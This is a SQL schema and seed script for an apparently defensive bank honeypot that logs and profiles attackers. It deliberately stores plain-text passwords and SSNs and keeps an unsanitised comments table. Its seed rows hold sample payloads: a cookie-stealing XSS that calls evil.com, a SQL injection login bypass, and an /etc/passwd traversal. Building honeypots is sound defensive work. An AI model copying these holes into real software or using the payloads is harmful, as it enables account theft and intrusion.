-- ============================================================
-- SECUREBANK HONEYPOT — UNIFIED SCHEMA (UPDATED)
-- Database: PostgreSQL (Neon.tech or local)
-- Run this once to set up everything from scratch
-- ============================================================

-- Drop all tables in correct order (foreign keys first)
DROP TABLE IF EXISTS honeytoken_alerts CASCADE;
DROP TABLE IF EXISTS session_recordings CASCADE;
DROP TABLE IF EXISTS honeytokens CASCADE;
DROP TABLE IF EXISTS transaction_alerts CASCADE;
DROP TABLE IF EXISTS support_tickets CASCADE;
DROP TABLE IF EXISTS comments CASCADE;
DROP TABLE IF EXISTS loans CASCADE;
DROP TABLE IF EXISTS transactions CASCADE;
DROP TABLE IF EXISTS ioc_records CASCADE;
DROP TABLE IF EXISTS attack_logs CASCADE;
DROP TABLE IF EXISTS attacker_profiles CASCADE;
DROP TABLE IF EXISTS users CASCADE;
DROP TABLE IF EXISTS employees CASCADE;
DROP TABLE IF EXISTS branches CASCADE;
DROP TABLE IF EXISTS roles CASCADE;

-- ============================================================
-- BANK CORE TABLES
-- ============================================================

CREATE TABLE roles (
    role_id          SERIAL PRIMARY KEY,
    role_name        VARCHAR(50) UNIQUE NOT NULL,
    role_description TEXT,
    permission_level INTEGER DEFAULT 1
);

CREATE TABLE branches (
    branch_id    SERIAL PRIMARY KEY,
    branch_code  VARCHAR(10) UNIQUE NOT NULL,
    branch_name  VARCHAR(200) NOT NULL,
    address      TEXT,
    city         VARCHAR(100),
    state        VARCHAR(100),
    country      VARCHAR(100),
    phone        VARCHAR(20),
    manager_name VARCHAR(100),
    is_active    BOOLEAN DEFAULT TRUE,
    created_at   TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE users (
    user_id               SERIAL PRIMARY KEY,
    username              VARCHAR(100) UNIQUE NOT NULL,
    password              VARCHAR(100) NOT NULL,        -- plain text intentionally (honeypot)
    email                 VARCHAR(200),
    phone                 VARCHAR(20),
    full_name             VARCHAR(200),
    date_of_birth         DATE,
    ssn                   VARCHAR(20),                  -- exposed intentionally (honeypot)
    address               TEXT,
    branch_id             INTEGER REFERENCES branches(branch_id),
    account_type          VARCHAR(50) DEFAULT 'savings',
    account_number        VARCHAR(20) UNIQUE,
    account_balance       DECIMAL(15,2) DEFAULT 0.00,
    credit_score          INTEGER DEFAULT 650,
    is_active             BOOLEAN DEFAULT TRUE,
    is_locked             BOOLEAN DEFAULT FALSE,
    failed_login_attempts INTEGER DEFAULT 0,
    created_at            TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_login            TIMESTAMP
);

CREATE TABLE employees (
    employee_id        SERIAL PRIMARY KEY,
    employee_code      VARCHAR(20) UNIQUE NOT NULL,
    username           VARCHAR(100) UNIQUE NOT NULL,
    password           VARCHAR(100) NOT NULL,           -- plain text intentionally (honeypot)
    full_name          VARCHAR(200),
    email              VARCHAR(200),
    phone              VARCHAR(20),
    role_id            INTEGER REFERENCES roles(role_id),
    branch_id          INTEGER REFERENCES branches(branch_id),
    is_active          BOOLEAN DEFAULT TRUE,
    can_approve_loans  BOOLEAN DEFAULT FALSE,
    can_reset_passwords BOOLEAN DEFAULT FALSE,
    transaction_limit  DECIMAL(15,2) DEFAULT 10000.00,
    created_at         TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_login         TIMESTAMP
);

CREATE TABLE transactions (
    transaction_id   SERIAL PRIMARY KEY,
    transaction_ref  VARCHAR(50) UNIQUE,
    from_user_id     INTEGER REFERENCES users(user_id),
    to_user_id       INTEGER REFERENCES users(user_id),
    from_account     VARCHAR(20),
    to_account       VARCHAR(20),
    amount           DECIMAL(15,2),
    transaction_type VARCHAR(50),
    status           VARCHAR(20) DEFAULT 'pending',
    remarks          TEXT,
    approved_by      INTEGER REFERENCES employees(employee_id),
    ip_address       VARCHAR(45),
    user_agent       TEXT,
    created_at       TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    completed_at     TIMESTAMP
);

CREATE TABLE loans (
    loan_id          SERIAL PRIMARY KEY,
    loan_ref         VARCHAR(50) UNIQUE,
    user_id          INTEGER REFERENCES users(user_id),
    loan_amount      DECIMAL(15,2),
    interest_rate    DECIMAL(5,2),
    tenure_months    INTEGER,
    monthly_emi      DECIMAL(10,2),
    remaining_amount DECIMAL(15,2),
    status           VARCHAR(20) DEFAULT 'pending',
    purpose          TEXT,
    approved_by      INTEGER REFERENCES employees(employee_id),
    approved_at      TIMESTAMP,
    created_at       TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE support_tickets (
    ticket_id   SERIAL PRIMARY KEY,
    ticket_ref  VARCHAR(20) UNIQUE,
    user_id     INTEGER REFERENCES users(user_id),
    subject     VARCHAR(200),
    message     TEXT,
    status      VARCHAR(20) DEFAULT 'open',
    priority    VARCHAR(10) DEFAULT 'medium',
    assigned_to INTEGER REFERENCES employees(employee_id),
    created_at  TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    resolved_at TIMESTAMP,
    ip_address  VARCHAR(45)
);

CREATE TABLE transaction_alerts (
    alert_id       SERIAL PRIMARY KEY,
    transaction_id INTEGER REFERENCES transactions(transaction_id),
    alert_type     VARCHAR(50),
    severity       INTEGER CHECK (severity BETWEEN 1 AND 10),
    description    TEXT,
    is_resolved    BOOLEAN DEFAULT FALSE,
    resolved_by    INTEGER REFERENCES employees(employee_id),
    created_at     TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    resolved_at    TIMESTAMP
);

-- Comments table — unsanitised intentionally for stored XSS surface
CREATE TABLE comments (
    comment_id  SERIAL PRIMARY KEY,
    author      VARCHAR(100),
    author_type VARCHAR(20),
    content     TEXT,                                   -- raw, never sanitised
    target_type VARCHAR(50),
    target_id   INTEGER,
    is_approved BOOLEAN DEFAULT FALSE,
    created_at  TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    ip_address  VARCHAR(45),
    user_agent  TEXT
);

-- ============================================================
-- SECURITY / HONEYPOT TABLES
-- ============================================================

-- attack_logs — written by honeypot, READ by SOC dashboard
-- severity is INTEGER 1-10 matching schema (not LOW/MEDIUM/HIGH/CRITICAL string)
CREATE TABLE attack_logs (
    id                  SERIAL PRIMARY KEY,
    timestamp           TIMESTAMPTZ DEFAULT NOW(),
    source_ip           VARCHAR(45),
    source_port         INTEGER,
    method              VARCHAR(10),
    path                TEXT,
    payload             TEXT,
    attack_type         VARCHAR(50),    -- 'sqli' | 'xss' | 'bruteforce' | 'traversal' | 'recon' | 'csrf' | 'idor'
    sub_attack_type     VARCHAR(100),   -- e.g. 'union_based', 'stored', 'reflected'
    severity            INTEGER CHECK (severity BETWEEN 1 AND 10),  -- 1=low, 10=critical
    severity_label      VARCHAR(20) GENERATED ALWAYS AS (
                            CASE
                                WHEN severity >= 9 THEN 'CRITICAL'
                                WHEN severity >= 7 THEN 'HIGH'
                                WHEN severity >= 4 THEN 'MEDIUM'
                                ELSE 'LOW'
                            END
                        ) STORED,
    user_agent          TEXT,
    tool_detected       VARCHAR(100),
    os_fingerprint      VARCHAR(100),
    session_id          VARCHAR(255),
    targeted_endpoint   VARCHAR(200),
    attempted_username  VARCHAR(100),
    attempted_account   VARCHAR(20),
    response_code       INTEGER,
    is_blocked          BOOLEAN DEFAULT FALSE
);

-- attacker_profiles — enriched by GeoIP + fingerprinting
CREATE TABLE attacker_profiles (
    ip                            VARCHAR(45) PRIMARY KEY,
    first_seen                    TIMESTAMPTZ DEFAULT NOW(),
    last_seen                     TIMESTAMPTZ DEFAULT NOW(),
    total_requests                INTEGER DEFAULT 0,
    threat_score                  INTEGER DEFAULT 0 CHECK (threat_score BETWEEN 0 AND 100),
    country                       VARCHAR(100),
    city                          VARCHAR(100),
    isp                           VARCHAR(200),
    os                            VARCHAR(100),
    tool                          VARCHAR(100),
    is_known_malicious            BOOLEAN DEFAULT FALSE,
    sqli_count                    INTEGER DEFAULT 0,
    xss_count                     INTEGER DEFAULT 0,
    bruteforce_count              INTEGER DEFAULT 0,
    traversal_count               INTEGER DEFAULT 0,
    csrf_count                    INTEGER DEFAULT 0,
    idor_count                    INTEGER DEFAULT 0,
    attempted_account_takeover    BOOLEAN DEFAULT FALSE,
    attempted_funds_transfer      BOOLEAN DEFAULT FALSE,
    attempted_privilege_escalation BOOLEAN DEFAULT FALSE,
    latitude                      DECIMAL(10,8),
    longitude                     DECIMAL(11,8),
    last_updated                  TIMESTAMPTZ DEFAULT NOW()
);

-- ioc_records — Indicators of Compromise
CREATE TABLE ioc_records (
    id                   SERIAL PRIMARY KEY,
    ip                   VARCHAR(45),
    attack_types         TEXT,
    first_seen           TIMESTAMPTZ DEFAULT NOW(),
    last_seen            TIMESTAMPTZ DEFAULT NOW(),
    threat_score         INTEGER,
    reported_to_abuseipdb BOOLEAN DEFAULT FALSE,
    blocked_automatically BOOLEAN DEFAULT FALSE,
    blocked_at           TIMESTAMP,
    notes                TEXT
);

-- honeytokens — fake credentials/API keys planted in responses to trap attackers
CREATE TABLE honeytokens (
    id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    type            VARCHAR(50),                            -- 'credential' | 'apikey' | 'file'
    value           JSONB,                                  -- the fake data object
    attacker_ip     VARCHAR(45) REFERENCES attacker_profiles(ip) ON DELETE SET NULL,
    created_at      TIMESTAMPTZ DEFAULT NOW(),
    issued_at       TIMESTAMPTZ DEFAULT NOW(),              -- when token was issued to attacker
    expires_at      TIMESTAMPTZ DEFAULT (NOW() + INTERVAL '24 hours'), -- token expiry time (24h default)
    triggered_at    TIMESTAMPTZ,
    expired_use_at  TIMESTAMPTZ,                            -- when expired token was attempted to be reused
    status          VARCHAR(20) DEFAULT 'active',           -- 'active' | 'triggered' | 'inactive' | 'expired'
    ttl_seconds     INTEGER DEFAULT 86400                   -- time-to-live in seconds (24h = 86400s)
);

-- session_recordings — every HTTP request an attacker makes, in sequence
CREATE TABLE session_recordings (
    id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    session_id      VARCHAR(255),
    attacker_ip     VARCHAR(45),
    request_method  VARCHAR(10),
    request_path    TEXT,
    request_body    TEXT,
    response_code   INTEGER,
    timestamp       TIMESTAMPTZ DEFAULT NOW(),
    sequence_number INTEGER
);

-- honeytoken_alerts — fired when attacker reuses a fake credential
CREATE TABLE honeytoken_alerts (
    id            UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    honeytoken_id UUID REFERENCES honeytokens(id) ON DELETE CASCADE,
    attacker_ip   VARCHAR(45),
    triggered_at  TIMESTAMPTZ DEFAULT NOW(),
    severity      VARCHAR(20) DEFAULT 'CRITICAL',
    details       JSONB
);

-- ============================================================
-- INDEXES
-- ============================================================

CREATE INDEX idx_attack_logs_ip          ON attack_logs(source_ip);
CREATE INDEX idx_attack_logs_timestamp   ON attack_logs(timestamp);
CREATE INDEX idx_attack_logs_attack_type ON attack_logs(attack_type);
CREATE INDEX idx_attack_logs_severity    ON attack_logs(severity DESC);
CREATE INDEX idx_attacker_profiles_score ON attacker_profiles(threat_score DESC);
CREATE INDEX idx_transactions_user       ON transactions(from_user_id, to_user_id);
CREATE INDEX idx_users_branch            ON users(branch_id);
CREATE INDEX idx_employees_role          ON employees(role_id);
CREATE INDEX idx_session_recordings_ip   ON session_recordings(attacker_ip);
CREATE INDEX idx_session_recordings_sid  ON session_recordings(session_id);
CREATE INDEX idx_honeytokens_ip          ON honeytokens(attacker_ip);
CREATE INDEX idx_honeytokens_status      ON honeytokens(status);

-- ============================================================
-- SEED DATA
-- ============================================================

INSERT INTO roles (role_name, role_description, permission_level) VALUES
('customer',         'Regular bank customer',                    1),
('teller',           'Bank teller - can process transactions',   5),
('branch_manager',   'Branch manager - can approve loans',       8),
('security_officer', 'Security team - can block IPs',            9),
('system_admin',     'Full system access',                       10);

INSERT INTO branches (branch_code, branch_name, address, city, state, country, phone, manager_name) VALUES
('BR001', 'Downtown Main Branch',    '123 Financial District', 'New York',    'NY', 'USA', '+1-212-555-0100', 'Michael Chen'),
('BR002', 'Westside Banking Center', '456 West Avenue',        'Los Angeles', 'CA', 'USA', '+1-310-555-0200', 'Sarah Johnson'),
('BR003', 'North Regional Hub',      '789 North Street',       'Chicago',     'IL', 'USA', '+1-312-555-0300', 'David Williams');

INSERT INTO employees (employee_code, username, password, full_name, email, phone, role_id, branch_id, can_approve_loans, can_reset_passwords, transaction_limit) VALUES
('EMP001', 'michael.chen',     'michael123',  'Michael Chen',  'michael.chen@securebank.com',     '+1-212-555-0101', (SELECT role_id FROM roles WHERE role_name = 'branch_manager'),   1, TRUE,  TRUE,  50000.00),
('EMP002', 'sarah.johnson',    'sarah456',    'Sarah Johnson', 'sarah.johnson@securebank.com',    '+1-310-555-0201', (SELECT role_id FROM roles WHERE role_name = 'branch_manager'),   2, TRUE,  TRUE,  50000.00),
('EMP003', 'john.teller',      'teller123',   'John Smith',    'john.smith@securebank.com',       '+1-212-555-0102', (SELECT role_id FROM roles WHERE role_name = 'teller'),           1, FALSE, FALSE, 10000.00),
('EMP004', 'security.analyst', 'security456', 'Emma Davis',    'emma.davis@securebank.com',       '+1-212-555-0103', (SELECT role_id FROM roles WHERE role_name = 'security_officer'), 1, FALSE, TRUE,  0.00),
('EMP005', 'admin.user',       'admin123',    'Admin User',    'admin@securebank.com',            '+1-000-555-0000', (SELECT role_id FROM roles WHERE role_name = 'system_admin'),     1, TRUE,  TRUE,  999999.99);

INSERT INTO users (username, password, email, phone, full_name, date_of_birth, ssn, address, branch_id, account_number, account_balance, credit_score) VALUES
('john_doe',     'password123', 'john.doe@email.com',    '+1-212-555-1001', 'John Doe',     '1985-03-15', '123-45-6789', '123 Home Street, NY',  1, 'ACC10001', 15420.50,  720),
('jane_smith',   'qwerty456',   'jane.smith@email.com',  '+1-310-555-1002', 'Jane Smith',   '1990-07-22', '987-65-4321', '456 Oak Avenue, CA',   2, 'ACC10002', 89300.75,  785),
('robert_brown', 'brown2024',   'robert.brown@email.com','+1-312-555-1003', 'Robert Brown', '1978-11-30', '555-12-3456', '789 Pine Road, IL',    3, 'ACC10003', 12500.00,  650),
('admin',        'admin',       'admin@securebank.com',  '+1-212-555-1005', 'Admin User',   '1980-01-01', '111-22-3333', '999 Admin Lane, NY',   1, 'ACC10999', 999999.99, 850),
('testuser',     'testpass',    'test@email.com',        '+1-212-555-1006', 'Test User',    '1995-12-25', '999-88-7777', '123 Test Street, NY',  1, 'ACC10005', 2500.00,   600);

INSERT INTO comments (author, author_type, content, target_type, ip_address) VALUES
('John Doe',  'customer', 'Great banking platform! Very secure.',                                                                     'feedback',       '192.168.1.100'),
('Jane Smith','customer', 'Love the new mobile app features.',                                                                        'feedback',       '192.168.1.101'),
('hacker',    'guest',    '<script>alert("XSS Attack!")</script>',                                                                    'support_ticket', '10.0.0.50'),
('attacker',  'guest',    '<img src="invalid" onerror="fetch(''http://evil.com/steal?cookie=''+document.cookie)">',                  'feedback',       '10.0.0.60');

INSERT INTO attack_logs (source_ip, method, path, payload, attack_type, sub_attack_type, severity, tool_detected, targeted_endpoint, attempted_username) VALUES
('185.220.101.45', 'POST', '/api/login',    'username=admin%27+OR+%271%27%3D%271&password=anything', 'sqli',      'auth_bypass',   9, 'sqlmap',    '/api/login',    'admin'),
('91.108.4.77',    'GET',  '/api/search',   'q=<script>alert(document.cookie)</script>',              'xss',       'reflected',     7, 'manual',    '/api/search',   NULL),
('194.165.16.80',  'GET',  '/api/download', 'file=../../../etc/passwd',                               'traversal', 'path_traversal',6, 'dirbuster', '/api/download', NULL),
('45.155.205.10',  'POST', '/api/login',    'username=admin&password=admin',                          'bruteforce','credential',    5, 'hydra',     '/api/login',    'admin'),
('45.155.205.10',  'POST', '/api/login',    'username=admin&password=123456',                         'bruteforce','credential',    5, 'hydra',     '/api/login',    'admin');

INSERT INTO attacker_profiles (ip, first_seen, last_seen, total_requests, threat_score, country, city, isp, os, tool, is_known_malicious, sqli_count, xss_count, bruteforce_count, traversal_count, latitude, longitude) VALUES
('185.220.101.45', NOW() - INTERVAL '2 hours', NOW() - INTERVAL '30 minutes', 18, 95, 'Germany',     'Frankfurt', 'Tor Exit Node',    'Linux x86_64', 'sqlmap', TRUE,  12, 0, 0, 2, 50.1109, 8.6821),
('91.108.4.77',    NOW() - INTERVAL '1 hour',  NOW() - INTERVAL '45 minutes', 12, 78, 'Netherlands', 'Amsterdam', 'Datacamp Limited', 'Windows 10',   'manual', FALSE, 0,  7, 0, 2, 52.3676, 4.9041),
('45.155.205.10',  NOW() - INTERVAL '3 hours', NOW() - INTERVAL '1 hour',     20, 60, 'Russia',      'Moscow',    'Selectel Ltd',     'Linux x86_64', 'hydra',  TRUE,  0,  0, 18,0, 55.7558, 37.6173),
('194.165.16.80',  NOW() - INTERVAL '4 hours', NOW() - INTERVAL '2 hours',    9,  88, 'Iran',        'Tehran',    'Respina Networks', 'Linux x86_64', 'nikto',  TRUE,  0,  0, 0, 9, 35.6892, 51.3890);

-- Verify
SELECT 'Schema created successfully' AS status;
SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' ORDER BY table_name;
